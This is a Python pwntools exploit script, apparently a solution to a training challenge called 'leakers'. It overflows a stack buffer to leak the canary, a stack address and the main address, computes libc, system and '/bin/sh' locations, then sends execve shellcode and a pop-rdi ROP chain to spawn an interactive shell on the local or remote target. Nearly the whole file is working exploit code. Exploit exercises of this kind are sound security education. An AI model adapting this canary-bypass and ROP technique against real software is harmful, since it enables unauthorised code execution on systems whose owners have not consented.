from pwn import *
import sys
 
context.clear(arch='amd64',os='linux')

if(len(sys.argv)>1):
	run_local = False
else:
	run_local = True

print(run_local)
if run_local:
	s = ssh(host='localhost',user='acidburn',port=2222)
	r= s.process('/home/acidburn/Desktop/leakers')
else:
	r=remote("bin.training.jinblack.it",2011)

input("wait")
ret=r.recv_raw(200)
input('Send bad string')
shellcode = b"\x90"*105
r.send(shellcode)


ret=r.recv_raw(200)
ret=ret[107:]
ret= ret[:len(ret)-3]
canary=b'\x00'+ret
canary=u64(canary)
print("[!]CANARY :" +hex(canary))


input("Leak the stack")
payload_to_leak_stack=b'B'*(104 + 4*8)
r.send(payload_to_leak_stack)
ret=r.recv_raw(190)
ret=u64(ret[138:]+b'\x00\x00')
delta= 0x158
address= ret-delta+1
print("[!]STACK ADDRESS: "+hex(address))

input("Leak the main")
payload_to_leak_main=b'B'*(104 + 4*8+16)
r.send(payload_to_leak_main)
ret=r.recv_raw(190)
print(ret[154:])
ret=u64(ret[154:]+b'\x00\x00\x00\x00\x00')
main= ret
print("[!]MAIN ADDRESS: "+hex(main))


libc=main+0x7ffff75e0e9a
system=libc+0x4f420
binsh=libc+0x1b3d88
print("[!]LIBC ADDRESS: "+hex(libc))
print("[!]SYSTEM ADDRESS: "+hex(system))
print("[!]BINSH ADDRESS: "+hex(binsh))




sc = b'\x48\x31\xd2\x48\x31\xf6\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\xb8\x3b\x00\x00\x00\x0f\x05/bin/sh\x00'

##ROP CHAIN
#0x00000000004012a3: pop rdi; ret; 
rop_payload=p64(0x00000000004012a3)
rop_payload+=p64(binsh)
rop_payload+=p64(system)
input('Revive canary and overwrite return address')
#shellcode = b"\x90"*69+sc+b'\x00'+canary+b'\x50'*8+rop_payload

shellcode = b"\x90"*69+sc+p64(canary)+b'\x50'*8+p64(address)
shellcode = b"\x90"*69+sc+p64(canary)+b'\x50'*8+p64(0x00000000004012a3)+p64(binsh)+p64(system)
r.send(shellcode)
gdb.attach(r)
input("gdb")
r.interactive()
